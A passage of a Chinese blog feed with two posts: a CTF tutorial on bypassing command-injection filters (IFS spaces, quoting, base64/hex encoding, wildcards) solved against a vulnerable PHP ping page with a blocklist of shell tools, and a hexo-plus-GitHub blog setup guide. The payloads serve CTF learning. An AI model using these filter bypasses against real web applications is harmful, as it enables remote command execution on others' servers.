    <link href="https://arsenetang.github.io/2021/07/20/RCE%E7%AF%87%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/"/>
    <id>https://arsenetang.github.io/2021/07/20/RCE%E7%AF%87%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/</id>
    <published>2021-07-19T16:00:00.000Z</published>
    <updated>2021-08-09T14:13:33.896Z</updated>
    
    <content type="html"><![CDATA[<h1 id="命令执行中的各种绕过"><a href="#命令执行中的各种绕过" class="headerlink" title="命令执行中的各种绕过"></a>命令执行中的各种绕过</h1><p>在ctf中，命令执行一直是一个非常重要的考点，一道ctf题最后往往都需要我们执行命令来拿到flag，但一般都会有各种各样的过滤限制，接下来就来总结一下如何绕过这些过滤</p><span id="more"></span><h2 id="1-绕过空格"><a href="#1-绕过空格" class="headerlink" title="1.绕过空格"></a>1.绕过空格</h2><p>常见的绕过空格的方法有<code>$IFS$9</code>,<code>$IFS</code>,<code>$IFS$1</code>,<code>$&#123;IFS&#125;</code>,<code>%09</code>,$IFS是linux下的分隔符，加上{}或者后面加$表示截断，防止与后面的变量名粘连导致命令无法执行，而<code>$9</code>指的是当前系统shell进程的第九个参数的持有者，就是一个空字符串，因此<code>$9</code>相当于没有加东西，等于做了一个前后隔离，基本上用上面的方法都可以绕过空格了，还有一些不常用的方法，比如说用<code>cat&lt;a.txt</code>表示<code>cat a.txt</code>，<code>&#123;cat,flag.php&#125;</code>等等</p><h2 id="2-绕过分隔符"><a href="#2-绕过分隔符" class="headerlink" title="2.绕过分隔符"></a>2.绕过分隔符</h2><p>linux下执行两条不同的命令中间需要分隔符，分隔符一般都是用<code>||</code>或者<code>;</code> 这两个一般都会有一个不会被禁掉，直接用就行，<code>;</code>只起分隔作用，不关心彼此是否执行成功，所有命令都会执行，而<code>||</code>实现逻辑或的功能，只有在左边的命令执行失败时，右边的命令才会执行</p><h2 id="3-绕过关键字"><a href="#3-绕过关键字" class="headerlink" title="3.绕过关键字"></a>3.绕过关键字</h2><p>这个应该是最重要的了，每次过滤的重点就是关键字，一般绕过的方法如下：</p><h3 id="1-中间加入符号"><a href="#1-中间加入符号" class="headerlink" title="1.中间加入符号"></a>1.中间加入符号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">这种我认为是最常见也是最简单的，你可以在命令中添加反斜杠\或者双引号&quot;或者反引号`来绕过正则匹配</span><br><span class="line">但要记住的是，两个字母之间反斜杠\只能加一个，双引号&quot;和反引号`因为要闭合所以只能加偶数个，否则就不能执行命令了：</span><br><span class="line">ls -&gt; l\s</span><br><span class="line">ls -&gt; l&quot;&quot;s</span><br><span class="line">ls -&gt; l``s</span><br><span class="line">cat /flag -&gt; ca\t /flag -&gt; c\a\t /flag</span><br><span class="line">cat /flag -&gt; ca&quot;&quot;t /flag -&gt; c&quot;&quot;a&quot;&quot;t /flag</span><br><span class="line">cat /flag -&gt; ca``t /flag -&gt; c``a``t /flag</span><br></pre></td></tr></table></figure><h3 id="2-拆分命令绕过"><a href="#2-拆分命令绕过" class="headerlink" title="2.拆分命令绕过"></a>2.拆分命令绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这种方法还是非常常见的，就是通过拆分和拼接的方式，可以绕过对命令和对文件名的正则匹配，达到执行命令的目的</span><br><span class="line">但这种方式有很大的弊端就是当分号被过滤掉之后就很难使用了：</span><br><span class="line">ls -&gt; a=l;b=s;$a$b</span><br><span class="line">cat /flag -&gt; a=ag;b=fl;cat /$b$a;</span><br></pre></td></tr></table></figure><h3 id="3-编码绕过"><a href="#3-编码绕过" class="headerlink" title="3.编码绕过"></a>3.编码绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">这种方法网上写的非常多，但我觉得实际能用的情况其实挺少的，而且构造它也相对比较麻烦，这里就简单推荐两种方法：</span><br><span class="line">1.base64</span><br><span class="line">echo &#x27;cat&#x27; | base64  --&gt; Y2F0Cg==</span><br><span class="line">那我们就可以构造cat /flag为：</span><br><span class="line">`echo &#x27;Y2F0Cg==&#x27; | base64 -d` /flag</span><br><span class="line">2.hex</span><br><span class="line">echo 77686F616D69 | xxd -r -p | bash </span><br><span class="line">其中77686F616D69是whoami的hex编码</span><br></pre></td></tr></table></figure><h3 id="4-通配符绕过"><a href="#4-通配符绕过" class="headerlink" title="4.通配符绕过"></a>4.通配符绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这种方式主要是针对文件名那几个字符被过滤时可以使用，就是用?或者*来代替具体的字符</span><br><span class="line">但一定注意这是针对文件名的哈，命令是肯定不能直接这么用的，但linux下命令其实也是文件</span><br><span class="line">比如说像cat就对应文件/bin/cat，ls就对应文件/bin/ls等等，我们也可以用类似的方法进行构造：</span><br><span class="line">ls -&gt; /bin/l?</span><br><span class="line">cat -&gt; /bin/c??</span><br><span class="line">像preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)这种flag字样都是被过滤了的，我们用通配符就很好用：</span><br><span class="line">cat /flag -&gt; /bin/ca? /????</span><br></pre></td></tr></table></figure><h2 id="4-例题解析—–BMZCTF-端午就该吃粽子"><a href="#4-例题解析—–BMZCTF-端午就该吃粽子" class="headerlink" title="4.例题解析—–BMZCTF 端午就该吃粽子"></a>4.例题解析—–BMZCTF 端午就该吃粽子</h2><p>前面的过程就不讲了，核心源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(;|&#x27;| |&gt;|]|&amp;| |python|sh|nc|tac|rev|more|tailf|index|php|head|nl|sort|less|cat|ruby|perl|bash|rm|cp|mv|\*)/i&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;&lt;script language=&#x27;javascript&#x27; type=&#x27;text/javascript&#x27;&gt;</span></span><br><span class="line"><span class="string">      alert(&#x27;no no no!&#x27;)</span></span><br><span class="line"><span class="string">      window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;&lt;script language=&#x27;javascript&#x27; type=&#x27;text/javascript&#x27;&gt;</span></span><br><span class="line"><span class="string">      alert(&#x27;no flag!&#x27;)</span></span><br><span class="line"><span class="string">      window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>核心语句是<code>shell_exec(&quot;ping -c 4 &quot;.$ip);</code>相当于就是一个有过滤情况下的命令执行，那按照前面讲的方法绕过的方法就很多了，很多种方法都可以拿到flag，我们先<code>ls</code>一下根目录，空格就用<code>%09</code>代替：</p><p><img src="https://i.loli.net/2021/07/20/Su8FlUMJ35Hx6k2.png" alt="image.png"></p><p>可以看到flag就在根目录下，那我们看它的方法就很多了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1||c&quot;&quot;at%09/????</span><br><span class="line">1||c\a\t$IFS$9/????</span><br><span class="line">1||/bin/c??$IFS/????</span><br><span class="line">1||c&quot;&quot;at%09$(find%09/%09-name%09f??g)</span><br><span class="line">等等等等非常多种，可以随意组合实现cat /flag这条命令,然后就得到flag了</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/20/cMWse5nqX7BR8CA.png" alt="image.png"></p><p>顺便这里再多讲一个，有的ctf题恶心人，他不把flag放根目录下，找它就很费功夫，就可以用下列语句找flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;find / -name flag*&quot;)：查找所有文件名匹配flag*的文件</span><br><span class="line">system(&quot;cat $(find / -name flag*)&quot;)：打印所有文件名匹配flag*的文件</span><br><span class="line">一般直接用第二条就可以打印出flag文件了,当然如果是有过滤的话就按照上面的方法绕过就好啦！</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;命令执行中的各种绕过&quot;&gt;&lt;a href=&quot;#命令执行中的各种绕过&quot; class=&quot;headerlink&quot; title=&quot;命令执行中的各种绕过&quot;&gt;&lt;/a&gt;命令执行中的各种绕过&lt;/h1&gt;&lt;p&gt;在ctf中，命令执行一直是一个非常重要的考点，一道ctf题最后往往都需要我们执行命令来拿到flag，但一般都会有各种各样的过滤限制，接下来就来总结一下如何绕过这些过滤&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="RCE" scheme="https://arsenetang.github.io/tags/RCE/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>hexo+github搭建个人博客</title>
    <link href="https://arsenetang.github.io/2021/07/10/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>https://arsenetang.github.io/2021/07/10/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</id>
    <published>2021-07-09T16:00:00.000Z</published>
    <updated>2021-11-10T11:37:08.145Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hexo-github搭建个人博客的过程及注意事项"><a href="#hexo-github搭建个人博客的过程及注意事项" class="headerlink" title="hexo+github搭建个人博客的过程及注意事项"></a>hexo+github搭建个人博客的过程及注意事项</h1><p>前几天刚利用hexo+github搭建好了个人博客，那么这第一篇文章就来写写搭建过程，说不定以后用得到，也希望能给想搭建的朋友提供一些帮助，能少踩一点坑</p><span id="more"></span><h2 id="第一步：工具安装"><a href="#第一步：工具安装" class="headerlink" title="第一步：工具安装"></a>第一步：工具安装</h2><p>首先是工具的安装，我们先安装GitBash，进入git官网：<a href="https://git-scm.com/">https://git-scm.com/</a>，直接点击download选择相应版本下载即可；</p><p>然后安装node.js，直接进入node官网：<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a>下载即可，安装时一定要勾选全部组件，以及<code>add to path</code>，让它给你自动配置环境变量，这样安装node.js时就已经完成了npm的安装以及环境变量的配置。完成后在cmd和Git Bash下都输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v # 会显示node版本号，说明安装成功</span><br><span class="line">npm -v # 会显示npm版本号，说明安装成功</span><br></pre></td></tr></table></figure><p>如果它显示<code>command not found</code>，可能就是环境变量配置有问题，记得用户变量也需要配置，把npm的用户变量配上就行</p><p><img src="https://i.loli.net/2021/07/10/XsaKNBVELxtguDZ.png" alt="image.png"></p><h2 id="第二步：GitHub注册"><a href="#第二步：GitHub注册" class="headerlink" title="第二步：GitHub注册"></a>第二步：GitHub注册</h2><p>然后进入到github官网：<a href="https://github.com/">https://github.com/</a>，注册一个自己的账号，邮箱和用户名要选择常用的哈，方便记住，然后在Git Bash上设置一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;user_name&quot; # user_name填入GitHub用户名</span><br><span class="line">git config --global user.email &quot;user_email&quot; # user_email填入GitHub注册的邮箱</span><br></pre></td></tr></table></figure><p>然后我们查看已设置的用户名和邮箱，能看到就说明设置成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/10/QRzEtF7N5smLBWv.png" alt="image.png"></p><h2 id="第三步：GitHub创建仓库及配置SSH-key"><a href="#第三步：GitHub创建仓库及配置SSH-key" class="headerlink" title="第三步：GitHub创建仓库及配置SSH key"></a>第三步：GitHub创建仓库及配置SSH key</h2><p>登录github后选择右上角+号，选择new repository，用户名必须为:<strong>你的用户名.github.io</strong>，这里必须注意，否则后面会出问题，那么将来你的网站首页地址就是：https://你的用户名.github.io了，就像下图这样(我的肯定是已注册）</p><p><img src="https://i.loli.net/2021/07/10/H4X37Lcn1hb2ElO.png" alt="image.png"></p><p>打开Git Bash，在里面输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;user.email&quot; # user.email为GitHub上注册的邮箱</span><br></pre></td></tr></table></figure><p>然后直接三个回车即可，默认不需要设置密码，当然你要设也可以，只是要记住，以后部署博客的时候需要用的，我觉得没太大必要，然后去用户主目录看有没有ssh密钥，就在这里面，如下图，将里面id_rsa.pub文件内容全部复制下来，注意看不要多了空格，换行符等等，id_rsa.pub是公钥，可以告诉他人，而id_rsa是私钥就不能泄露了，然后打开github设置密钥界面：<a href="https://github.com/settings/keys">https://github.com/settings/keys</a>，点击<code>New SSH key</code>,tiitle为标题可以随便取，然后内容为刚刚复制的id_rsa.pub公钥复制进去即可，最后点击<code>Add SSH key</code></p><p><img src="https://i.loli.net/2021/07/10/fIt52ZSewEAaJuV.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/29/FWX5u2LzfBlbnY9.png" alt="image.png"></p><p>然后我们在Git Bash中验证是否连接成功，输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>这里面需要注意的是，第一次输入的时候它会问你yes/no，你得输入yes后再回车，不能直接回车，然后显示出下图这个页面说明连接成功：</p><p><img src="https://i.loli.net/2021/07/10/dymWaeJu1Cl7SvP.png" alt="image.png"></p><h2 id="第四步：安装hexo"><a href="#第四步：安装hexo" class="headerlink" title="第四步：安装hexo"></a>第四步：安装hexo</h2><p><code>Hexo</code> 是一个简单、快速、强大的基于 <code>Github Pages</code> 的博客框架，支持 <code>Markdown</code> 格式，有众多优秀插件和主题。</p><p>然后我们就安装hexo，在Git Bash中操作哈，别用cmd，网上很多说直接用<code>$ npm install -g hexo-cli</code>直接安装的，我试了试一直不行，也不知道为什么，所以说我就先安装cnpm，这里我用的是淘宝的镜像源，如果错误就重来，因为连接可能不稳定，失败了多试几次就可以了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">cnpm -v   #如果显示cnpm的版本信息就说明安装成功</span><br><span class="line">cnpm install -g hexo-cli   #安装 hexo（如果失败重新来过)</span><br><span class="line">hexo -v   #返回 hexo 的版本信息</span><br></pre></td></tr></table></figure><p>如果这里显示出了hexo的版本信息，就说明安装成功了，然后我们在电脑中随便找一个地方，建立一个空文件夹，以后你博客的所有东西就都在这里面操作，进入这个空文件夹，右键，点击Git Bash Here，打开Git Bash终端，然后输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init     #初始化 hexo</span><br><span class="line">ls -l     #查看初始化获得的文件</span><br><span class="line">hexo s    #启动 hexo，本地预览</span><br></pre></td></tr></table></figure><p>然后这里如果都没问题的话，就可以在本地4000端口查看自己的网站了，就是这个网站：<a href="http://localhost:4000/">http://localhost:4000</a></p><h2 id="第五步：将博客部署到GitHub上"><a href="#第五步：将博客部署到GitHub上" class="headerlink" title="第五步：将博客部署到GitHub上"></a>第五步：将博客部署到GitHub上</h2><p>然后我们就需要将我们本地的博客搭到GitHub上去了，首先需要修改配置文件，打开博客文件夹中的配置文件<code>_config.yml</code>，需要进行修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">这里贴一份网上看到的  可以复制替换原来的  但是替换之前最好备份 可能会出错</span><br><span class="line">那要么你就对照着看一下改就好:</span><br><span class="line"># Hexo Configuration</span><br><span class="line">## Docs: http://zespia.tw/hexo/docs/configure.html</span><br><span class="line">## Source: https://github.com/tommy351/hexo/</span><br><span class="line"></span><br><span class="line"># Site </span><br><span class="line">title: My Blog #博客名</span><br><span class="line">subtitle: to be continued... #副标题</span><br><span class="line">description: My blog #给搜索引擎看的，对网站的描述，可以自定义</span><br><span class="line">author: Yourname #作者，在博客底部可以看到</span><br><span class="line">email: yourname@yourmail.com #你的联系邮箱</span><br><span class="line">language: zh-CN #中文。如果不填则默认英文</span><br><span class="line"></span><br><span class="line"># URL #这项暂不配置，绑定域名后，欲创建sitemap.xml需要配置该项</span><br><span class="line">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span><br><span class="line">url: http://yoursite.com</span><br><span class="line">root: /</span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">tag_dir: tags</span><br><span class="line">archive_dir: archives</span><br><span class="line">category_dir: categories</span><br><span class="line"></span><br><span class="line"># Writing 文章布局、写作格式的定义，不修改</span><br><span class="line">new_post_name: :title.md # File name of new posts</span><br><span class="line">default_layout: post</span><br><span class="line">auto_spacing: false # Add spaces between asian characters and western characters</span><br><span class="line">titlecase: false # Transform title into titlecase</span><br><span class="line">max_open_file: 100</span><br><span class="line">filename_case: 0</span><br><span class="line">highlight:</span><br><span class="line">  enable: true</span><br><span class="line">  backtick_code_block: true</span><br><span class="line">  line_number: true</span><br><span class="line">  tab_replace:</span><br><span class="line"></span><br><span class="line"># Category &amp; Tag</span><br><span class="line">default_category: uncategorized</span><br><span class="line">category_map:</span><br><span class="line">tag_map:</span><br><span class="line"></span><br><span class="line"># Archives 默认值为2，这里都修改为1，相应页面就只会列出标题，而非全文</span><br><span class="line">## 2: Enable pagination</span><br><span class="line">## 1: Disable pagination</span><br><span class="line">## 0: Fully Disable</span><br><span class="line">archive: 1</span><br><span class="line">category: 1</span><br><span class="line">tag: 1</span><br><span class="line"></span><br><span class="line"># Server 不修改</span><br><span class="line">## Hexo uses Connect as a server</span><br><span class="line">## You can customize the logger format as defined in</span><br><span class="line">## http://www.senchalabs.org/connect/logger.html</span><br><span class="line">port: 4000</span><br><span class="line">logger: false</span><br><span class="line">logger_format:</span><br><span class="line"></span><br><span class="line"># Date / Time format 日期格式，可以修改成自己喜欢的格式</span><br><span class="line">## Hexo uses Moment.js to parse and display date</span><br><span class="line">## You can customize the date format as defined in</span><br><span class="line">## http://momentjs.com/docs/#/displaying/format/</span><br><span class="line">date_format: YYYY-M-D</span><br><span class="line">time_format: H:mm:ss</span><br><span class="line"></span><br><span class="line"># Pagination 每页显示文章数，可以自定义，贴主设置的是10</span><br><span class="line">## Set per_page to 0 to disable pagination</span><br><span class="line">per_page: 10</span><br><span class="line">pagination_dir: page</span><br><span class="line"></span><br><span class="line"># Disqus Disqus插件，我们会替换成“多说”，不修改</span><br><span class="line">disqus_shortname:</span><br><span class="line"></span><br><span class="line"># Extensions 这里配置站点所用主题和插件，暂时默认</span><br><span class="line">## Plugins: https://github.com/tommy351/hexo/wiki/Plugins</span><br><span class="line">## Themes: https://github.com/tommy351/hexo/wiki/Themes</span><br><span class="line">theme: landscape</span><br><span class="line">exclude_generator:</span><br><span class="line">plugins:</span><br><span class="line">- hexo-generator-feed</span><br><span class="line">- hexo-generator-sitemap</span><br><span class="line"></span><br><span class="line"># Deployment 站点部署到github要配置(重点！！！)</span><br><span class="line">## Docs: http://zespia.tw/hexo/docs/deploy.html</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: //这里是需要填的，下面会讲</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>然后我们打开Github个人主页的Repository，进入到自己的博客项目，复制项目的SSH码，这里一定要看清楚是复制SSH码哈，<a href="mailto:&#x67;&#105;&#x74;&#x40;&#103;&#x69;&#116;&#104;&#117;&#x62;&#x2e;&#x63;&#111;&#109;">&#x67;&#105;&#x74;&#x40;&#103;&#x69;&#116;&#104;&#117;&#x62;&#x2e;&#x63;&#111;&#109;</a>开头的，然后粘贴到配置文件最后的repository中，粘贴好后CTRL+S保存即可：</p><p><img src="https://i.loli.net/2021/07/10/QPj8UKGsRDaLBI1.png" alt="image.png"></p><p>然后依次执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean // 清除存缓（不用每次执行）</span><br><span class="line">hexo g     // 修改生成</span><br><span class="line">hexo s     // 修改预览（不用每次执行） </span><br><span class="line">hexo d     // 修改部署</span><br></pre></td></tr></table></figure><p>最后一步<code>hexo d</code>是最重要的，但这里可能会出现<code>ERROR Deployer not found: git</code>报错，这是因为我们没有安装<code>hexo-deployer-git</code>这个插件，但因为安装这个插件需要新建文件夹，而在有的目录下新建文件夹需要管理员权限，这里就需要就在开始菜单输入cmd，并且以管理员身份运行就可，如下图：</p><p><img src="https://i.loli.net/2021/07/10/WvS8ol1GTty5hDL.png" alt="image.png"></p><p>然后执行<code>cnpm install hexo-deployer-git --save</code>安装这个插件，这里还有一个坑，就是必须要在站点目录下执行这句安装<code>hexo-deployer-git</code>的命令，所谓站点目录就是执行<code>hexo init</code>的目录，也就是建立博客的主文件夹，要在里面执行命令才行，如果已经在其他目录安装了<code>hexo-deployer-git</code>插件的小伙伴，可以使用以下命令卸载该插件：<code>cnpm uninstall hexo-deployer-git --save</code>，由于我们是打开的是cmd，所以说要先用<code>cd</code>命令转到站点目录下，然后执行命令安装<code>hexo-deployer-git</code>插件就行啦，然后<code>hexo d</code>就不会报错啦，等一两分钟去看自己博客主页就有东西啦！我们的博客就搭好啦！快往里面放东西吧！</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;hexo-github搭建个人博客的过程及注意事项&quot;&gt;&lt;a href=&quot;#hexo-github搭建个人博客的过程及注意事项&quot; class=&quot;headerlink&quot; title=&quot;hexo+github搭建个人博客的过程及注意事项&quot;&gt;&lt;/a&gt;hexo+github搭建个人博客的过程及注意事项&lt;/h1&gt;&lt;p&gt;前几天刚利用hexo+github搭建好了个人博客，那么这第一篇文章就来写写搭建过程，说不定以后用得到，也希望能给想搭建的朋友提供一些帮助，能少踩一点坑&lt;/p&gt;</summary>
    
    
    
    
    <category term="环境搭建" scheme="https://arsenetang.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
</feed>
